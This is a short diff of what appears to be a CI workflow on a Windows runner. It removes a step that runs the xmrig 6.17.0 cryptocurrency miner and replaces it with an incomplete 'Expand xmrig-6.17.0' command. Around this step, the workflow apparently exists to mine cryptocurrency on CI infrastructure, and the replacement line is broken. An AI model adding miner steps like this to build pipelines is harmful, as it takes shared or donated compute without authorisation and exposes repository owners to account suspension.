@@ -34,6 +34,6 @@ jobs:
     - name: Dir
       run: ls
     - name: Running
-      run: .\xmrig-6.17.0\xmrig.exe
+      run: Expand xmrig-6.17.0
     - name: DONE
       run: exit
